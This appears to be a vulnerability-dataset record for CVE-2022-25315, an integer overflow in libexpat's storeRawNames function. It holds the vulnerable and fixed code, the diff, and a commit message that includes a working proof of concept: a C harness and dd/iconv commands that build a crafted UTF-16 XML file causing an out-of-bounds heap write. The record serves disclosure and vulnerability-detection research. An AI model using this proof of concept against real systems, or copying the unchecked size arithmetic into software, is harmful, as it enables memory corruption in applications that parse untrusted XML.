{
  "cve_id": "CVE-2022-25315",
  "cwe_ids": [
    "CWE-190"
  ],
  "cvss_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
  "cvss_is_v3": false,
  "repo_name": "libexpat",
  "commit_msg": "Prevent integer overflow in storeRawNames\n\nIt is possible to use an integer overflow in storeRawNames for out of\nboundary heap writes. Default configuration is affected. If compiled\nwith XML_UNICODE then the attack does not work. Compiling with\n-fsanitize=address confirms the following proof of concept.\n\nThe problem can be exploited by abusing the m_buffer expansion logic.\nEven though the initial size of m_buffer is a power of two, eventually\nit can end up a little bit lower, thus allowing allocations very close\nto INT_MAX (since INT_MAX/2 can be surpassed). This means that tag\nnames can be parsed which are almost INT_MAX in size.\n\nUnfortunately (from an attacker point of view) INT_MAX/2 is also a\nlimitation in string pools. Having a tag name of INT_MAX/2 characters\nor more is not possible.\n\nExpat can convert between different encodings. UTF-16 documents which\ncontain only ASCII representable characters are twice as large as their\nASCII encoded counter-parts.\n\nThe proof of concept works by taking these three considerations into\naccount:\n\n1. Move the m_buffer size slightly below a power of two by having a\n   short root node <a>. This allows the m_buffer to grow very close\n   to INT_MAX.\n2. The string pooling forbids tag names longer than or equal to\n   INT_MAX/2, so keep the attack tag name smaller than that.\n3. To be able to still overflow INT_MAX even though the name is\n   limited at INT_MAX/2-1 (nul byte) we use UTF-16 encoding and a tag\n   which only contains ASCII characters. UTF-16 always stores two\n   bytes per character while the tag name is converted to using only\n   one. Our attack node byte count must be a bit higher than\n   2/3 INT_MAX so the converted tag name is around INT_MAX/3 which\n   in sum can overflow INT_MAX.\n\nThanks to our small root node, m_buffer can handle 2/3 INT_MAX bytes\nwithout running into INT_MAX boundary check. The string pooling is\nable to store INT_MAX/3 as tag name because the amount is below\nINT_MAX/2 limitation. And creating the sum of both eventually overflows\nin storeRawNames.\n\nProof of Concept:\n\n1. Compile expat with -fsanitize=address.\n\n2. Create Proof of Concept binary which iterates through input\n   file 16 MB at once for better performance and easier integer\n   calculations:\n\n```\ncat > poc.c << EOF\n #include <err.h>\n #include <expat.h>\n #include <stdlib.h>\n #include <stdio.h>\n\n #define CHUNK (16 * 1024 * 1024)\n int main(int argc, char *argv[]) {\n   XML_Parser parser;\n   FILE *fp;\n   char *buf;\n   int i;\n\n   if (argc != 2)\n     errx(1, \"usage: poc file.xml\");\n   if ((parser = XML_ParserCreate(NULL)) == NULL)\n     errx(1, \"failed to create expat parser\");\n   if ((fp = fopen(argv[1], \"r\")) == NULL) {\n     XML_ParserFree(parser);\n     err(1, \"failed to open file\");\n   }\n   if ((buf = malloc(CHUNK)) == NULL) {\n     fclose(fp);\n     XML_ParserFree(parser);\n     err(1, \"failed to allocate buffer\");\n   }\n   i = 0;\n   while (fread(buf, CHUNK, 1, fp) == 1) {\n     printf(\"iteration %d: XML_Parse returns %d\\n\", ++i,\n       XML_Parse(parser, buf, CHUNK, XML_FALSE));\n   }\n   free(buf);\n   fclose(fp);\n   XML_ParserFree(parser);\n   return 0;\n }\nEOF\ngcc -fsanitize=address -lexpat -o poc poc.c\n```\n\n3. Construct specially prepared UTF-16 XML file:\n\n```\ndd if=/dev/zero bs=1024 count=794624 | tr '\\0' 'a' > poc-utf8.xml\necho -n '<a><' | dd conv=notrunc of=poc-utf8.xml\necho -n '><' | dd conv=notrunc of=poc-utf8.xml bs=1 seek=805306368\niconv -f UTF-8 -t UTF-16LE poc-utf8.xml > poc-utf16.xml\n```\n\n4. Run proof of concept:\n\n```\n./poc poc-utf16.xml\n```",
  "commit_hash": "eb0362808b4f9f1e2345a0cf203b8cc196d776d9",
  "git_url": "https://github.com/libexpat/libexpat/commit/eb0362808b4f9f1e2345a0cf203b8cc196d776d9",
  "file_path": "expat/lib/xmlparse.c",
  "func_name": "storeRawNames",
  "func_before": "static XML_Bool\nstoreRawNames(XML_Parser parser) {\n  TAG *tag = parser->m_tagStack;\n  while (tag) {\n    int bufSize;\n    int nameLen = sizeof(XML_Char) * (tag->name.strLen + 1);\n    char *rawNameBuf = tag->buf + nameLen;\n    /* Stop if already stored.  Since m_tagStack is a stack, we can stop\n       at the first entry that has already been copied; everything\n       below it in the stack is already been accounted for in a\n       previous call to this function.\n    */\n    if (tag->rawName == rawNameBuf)\n      break;\n    /* For re-use purposes we need to ensure that the\n       size of tag->buf is a multiple of sizeof(XML_Char).\n    */\n    bufSize = nameLen + ROUND_UP(tag->rawNameLength, sizeof(XML_Char));\n    if (bufSize > tag->bufEnd - tag->buf) {\n      char *temp = (char *)REALLOC(parser, tag->buf, bufSize);\n      if (temp == NULL)\n        return XML_FALSE;\n      /* if tag->name.str points to tag->buf (only when namespace\n         processing is off) then we have to update it\n      */\n      if (tag->name.str == (XML_Char *)tag->buf)\n        tag->name.str = (XML_Char *)temp;\n      /* if tag->name.localPart is set (when namespace processing is on)\n         then update it as well, since it will always point into tag->buf\n      */\n      if (tag->name.localPart)\n        tag->name.localPart\n            = (XML_Char *)temp + (tag->name.localPart - (XML_Char *)tag->buf);\n      tag->buf = temp;\n      tag->bufEnd = temp + bufSize;\n      rawNameBuf = temp + nameLen;\n    }\n    memcpy(rawNameBuf, tag->rawName, tag->rawNameLength);\n    tag->rawName = rawNameBuf;\n    tag = tag->parent;\n  }\n  return XML_TRUE;\n}",
  "abstract_func_before": "static XML_Bool\nstoreRawNames(XML_Parser VAR_0) {\n  TAG *VAR_1 = VAR_0->m_tagStack;\n  while (VAR_1) {\n    int VAR_2;\n    int VAR_3 = sizeof(VAR_4) * (VAR_1->name.strLen + 1);\n    char *VAR_5 = VAR_1->buf + VAR_3;\n    /* COMMENT_0 */\n                                                                  \n                                                               \n                                      \n      \n    if (VAR_1->rawName == VAR_5)\n      break;\n    /* COMMENT_5 */\n                                                          \n      \n    VAR_2 = VAR_3 + ROUND_UP(VAR_1->rawNameLength, sizeof(VAR_4));\n    if (VAR_2 > VAR_1->bufEnd - VAR_1->buf) {\n      char *VAR_6 = (char *)REALLOC(VAR_0, VAR_1->buf, VAR_2);\n      if (VAR_6 == NULL)\n        return VAR_7;\n      /* COMMENT_8 */\n                                                     \n        \n      if (VAR_1->name.str == (XML_Char *)VAR_1->buf)\n        VAR_1->name.str = (XML_Char *)VAR_6;\n      /* COMMENT_11 */\n                                                                         \n        \n      if (VAR_1->name.localPart)\n        VAR_1->name.localPart\n            = (XML_Char *)VAR_6 + (VAR_1->name.localPart - (XML_Char *)VAR_1->buf);\n      VAR_1->buf = VAR_6;\n      VAR_1->bufEnd = VAR_6 + VAR_2;\n      VAR_5 = VAR_6 + VAR_3;\n    }\n    memcpy(VAR_5, VAR_1->rawName, VAR_1->rawNameLength);\n    VAR_1->rawName = VAR_5;\n    VAR_1 = VAR_1->parent;\n  }\n  return VAR_8;\n}",
  "func_graph_path_before": "libexpat/eb0362808b4f9f1e2345a0cf203b8cc196d776d9/xmlparse.c/vul/before/0.json",
  "func": "static XML_Bool\nstoreRawNames(XML_Parser parser) {\n  TAG *tag = parser->m_tagStack;\n  while (tag) {\n    int bufSize;\n    int nameLen = sizeof(XML_Char) * (tag->name.strLen + 1);\n    size_t rawNameLen;\n    char *rawNameBuf = tag->buf + nameLen;\n    /* Stop if already stored.  Since m_tagStack is a stack, we can stop\n       at the first entry that has already been copied; everything\n       below it in the stack is already been accounted for in a\n       previous call to this function.\n    */\n    if (tag->rawName == rawNameBuf)\n      break;\n    /* For re-use purposes we need to ensure that the\n       size of tag->buf is a multiple of sizeof(XML_Char).\n    */\n    rawNameLen = ROUND_UP(tag->rawNameLength, sizeof(XML_Char));\n    /* Detect and prevent integer overflow. */\n    if (rawNameLen > (size_t)INT_MAX - nameLen)\n      return XML_FALSE;\n    bufSize = nameLen + (int)rawNameLen;\n    if (bufSize > tag->bufEnd - tag->buf) {\n      char *temp = (char *)REALLOC(parser, tag->buf, bufSize);\n      if (temp == NULL)\n        return XML_FALSE;\n      /* if tag->name.str points to tag->buf (only when namespace\n         processing is off) then we have to update it\n      */\n      if (tag->name.str == (XML_Char *)tag->buf)\n        tag->name.str = (XML_Char *)temp;\n      /* if tag->name.localPart is set (when namespace processing is on)\n         then update it as well, since it will always point into tag->buf\n      */\n      if (tag->name.localPart)\n        tag->name.localPart\n            = (XML_Char *)temp + (tag->name.localPart - (XML_Char *)tag->buf);\n      tag->buf = temp;\n      tag->bufEnd = temp + bufSize;\n      rawNameBuf = temp + nameLen;\n    }\n    memcpy(rawNameBuf, tag->rawName, tag->rawNameLength);\n    tag->rawName = rawNameBuf;\n    tag = tag->parent;\n  }\n  return XML_TRUE;\n}",
  "abstract_func": "static XML_Bool\nstoreRawNames(XML_Parser VAR_0) {\n  TAG *VAR_1 = VAR_0->m_tagStack;\n  while (VAR_1) {\n    int VAR_2;\n    int VAR_3 = sizeof(VAR_4) * (VAR_1->name.strLen + 1);\n    size_t VAR_5;\n    char *VAR_6 = VAR_1->buf + VAR_3;\n    /* COMMENT_0 */\n                                                                  \n                                                               \n                                      \n      \n    if (VAR_1->rawName == VAR_6)\n      break;\n    /* COMMENT_5 */\n                                                          \n      \n    VAR_5 = ROUND_UP(VAR_1->rawNameLength, sizeof(VAR_4));\n    /* COMMENT_8 */\n    if (VAR_5 > (size_t)VAR_7 - VAR_3)\n      return VAR_8;\n    VAR_2 = VAR_3 + (int)VAR_5;\n    if (VAR_2 > VAR_1->bufEnd - VAR_1->buf) {\n      char *VAR_9 = (char *)REALLOC(VAR_0, VAR_1->buf, VAR_2);\n      if (VAR_9 == NULL)\n        return VAR_8;\n      /* COMMENT_9 */\n                                                     \n        \n      if (VAR_1->name.str == (XML_Char *)VAR_1->buf)\n        VAR_1->name.str = (XML_Char *)VAR_9;\n      /* COMMENT_12 */\n                                                                         \n        \n      if (VAR_1->name.localPart)\n        VAR_1->name.localPart\n            = (XML_Char *)VAR_9 + (VAR_1->name.localPart - (XML_Char *)VAR_1->buf);\n      VAR_1->buf = VAR_9;\n      VAR_1->bufEnd = VAR_9 + VAR_2;\n      VAR_6 = VAR_9 + VAR_3;\n    }\n    memcpy(VAR_6, VAR_1->rawName, VAR_1->rawNameLength);\n    VAR_1->rawName = VAR_6;\n    VAR_1 = VAR_1->parent;\n  }\n  return VAR_10;\n}",
  "func_graph_path": "libexpat/eb0362808b4f9f1e2345a0cf203b8cc196d776d9/xmlparse.c/vul/after/0.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -4,6 +4,7 @@\n   while (tag) {\n     int bufSize;\n     int nameLen = sizeof(XML_Char) * (tag->name.strLen + 1);\n+    size_t rawNameLen;\n     char *rawNameBuf = tag->buf + nameLen;\n     /* Stop if already stored.  Since m_tagStack is a stack, we can stop\n        at the first entry that has already been copied; everything\n@@ -15,7 +16,11 @@\n     /* For re-use purposes we need to ensure that the\n        size of tag->buf is a multiple of sizeof(XML_Char).\n     */\n-    bufSize = nameLen + ROUND_UP(tag->rawNameLength, sizeof(XML_Char));\n+    rawNameLen = ROUND_UP(tag->rawNameLength, sizeof(XML_Char));\n+    /* Detect and prevent integer overflow. */\n+    if (rawNameLen > (size_t)INT_MAX - nameLen)\n+      return XML_FALSE;\n+    bufSize = nameLen + (int)rawNameLen;\n     if (bufSize > tag->bufEnd - tag->buf) {\n       char *temp = (char *)REALLOC(parser, tag->buf, bufSize);\n       if (temp == NULL)",
  "diff_line_info": {
    "deleted_lines": [
      "    bufSize = nameLen + ROUND_UP(tag->rawNameLength, sizeof(XML_Char));"
    ],
    "added_lines": [
      "    size_t rawNameLen;",
      "    rawNameLen = ROUND_UP(tag->rawNameLength, sizeof(XML_Char));",
      "    /* Detect and prevent integer overflow. */",
      "    if (rawNameLen > (size_t)INT_MAX - nameLen)",
      "      return XML_FALSE;",
      "    bufSize = nameLen + (int)rawNameLen;"
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/libexpat/libexpat/pull/559",
  "description": {
    "pr_info": {
      "title": "[CVE-2022-25315] lib: Prevent integer overflow in storeRawNames",
      "number": 559
    },
    "comment": [
      "It is possible to use an integer overflow in storeRawNames for out of\r\nboundary heap writes. Default configuration is affected. If compiled\r\nwith XML_UNICODE then the attack does not work. Compiling with\r\n-fsanitize=address confirms the following proof of concept.\r\n\r\nThe problem can be exploited by abusing the m_buffer expansion logic.\r\nEven though the initial size of m_buffer is a power of two, eventually\r\nit can end up a little bit lower, thus allowing allocations very close\r\nto INT_MAX (since INT_MAX/2 can be surpassed). This means that tag\r\nnames can be parsed which are almost INT_MAX in size.\r\n\r\nUnfortunately (from an attacker point of view) INT_MAX/2 is also a\r\nlimitation in string pools. Having a tag name of INT_MAX/2 characters\r\nor more is not possible.\r\n\r\nExpat can convert between different encodings. UTF-16 documents which\r\ncontain only ASCII representable characters are twice as large as their\r\nASCII encoded counter-parts.\r\n\r\nThe proof of concept works by taking these three considerations into\r\naccount:\r\n\r\n1. Move the m_buffer size slightly below a power of two by having a\r\n   short root node <a>. This allows the m_buffer to grow very close\r\n   to INT_MAX.\r\n2. The string pooling forbids tag names longer than or equal to\r\n   INT_MAX/2, so keep the attack tag name smaller than that.\r\n3. To be able to still overflow INT_MAX even though the name is\r\n   limited at INT_MAX/2-1 (nul byte) we use UTF-16 encoding and a tag\r\n   which only contains ASCII characters. UTF-16 always stores two\r\n   bytes per character while the tag name is converted to using only\r\n   one. Our attack node byte count must be a bit higher than\r\n   2/3 INT_MAX so the converted tag name is around INT_MAX/3 which\r\n   in sum can overflow INT_MAX.\r\n\r\nThanks to our small root node, m_buffer can handle 2/3 INT_MAX bytes\r\nwithout running into INT_MAX boundary check. The string pooling is\r\nable to store INT_MAX/3 as tag name because the amount is below\r\nINT_MAX/2 limitation. And creating the sum of both eventually overflows\r\nin storeRawNames.\r\n\r\nProof of Concept:\r\n\r\n1. Compile expat with -fsanitize=address.\r\n\r\n2. Create Proof of Concept binary which iterates through input\r\n   file 16 MB at once for better performance and easier integer\r\n   calculations:\r\n\r\n```\r\ncat > poc.c << EOF\r\n #include <err.h>\r\n #include <expat.h>\r\n #include <stdlib.h>\r\n #include <stdio.h>\r\n\r\n #define CHUNK (16 * 1024 * 1024)\r\n int main(int argc, char *argv[]) {\r\n   XML_Parser parser;\r\n   FILE *fp;\r\n   char *buf;\r\n   int i;\r\n\r\n   if (argc != 2)\r\n     errx(1, \"usage: poc file.xml\");\r\n   if ((parser = XML_ParserCreate(NULL)) == NULL)\r\n     errx(1, \"failed to create expat parser\");\r\n   if ((fp = fopen(argv[1], \"r\")) == NULL) {\r\n     XML_ParserFree(parser);\r\n     err(1, \"failed to open file\");\r\n   }\r\n   if ((buf = malloc(CHUNK)) == NULL) {\r\n     fclose(fp);\r\n     XML_ParserFree(parser);\r\n     err(1, \"failed to allocate buffer\");\r\n   }\r\n   i = 0;\r\n   while (fread(buf, CHUNK, 1, fp) == 1) {\r\n     printf(\"iteration %d: XML_Parse returns %d\\n\", ++i,\r\n       XML_Parse(parser, buf, CHUNK, XML_FALSE));\r\n   }\r\n   free(buf);\r\n   fclose(fp);\r\n   XML_ParserFree(parser);\r\n   return 0;\r\n }\r\nEOF\r\ngcc -fsanitize=address -lexpat -o poc poc.c\r\n```\r\n\r\n3. Construct specially prepared UTF-16 XML file:\r\n\r\n```\r\ndd if=/dev/zero bs=1024 count=794624 | tr '\\0' 'a' > poc-utf8.xml\r\necho -n '<a><' | dd conv=notrunc of=poc-utf8.xml\r\necho -n '><' | dd conv=notrunc of=poc-utf8.xml bs=1 seek=805306368\r\niconv -f UTF-8 -t UTF-16LE poc-utf8.xml > poc-utf16.xml\r\n```\r\n\r\n4. Run proof of concept:\r\n\r\n```\r\n./poc poc-utf16.xml\r\n```",
      "This issue appears to be [CVE-2022-25315](https://www.cve.org/CVERecord?id=CVE-2022-25315)"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix",
  "Bug Filter Confidence": 1.0,
  "Bug Filter Response": "**Final Classification:** Security Vulnerability Fix; **Confidence:** 1.0"
}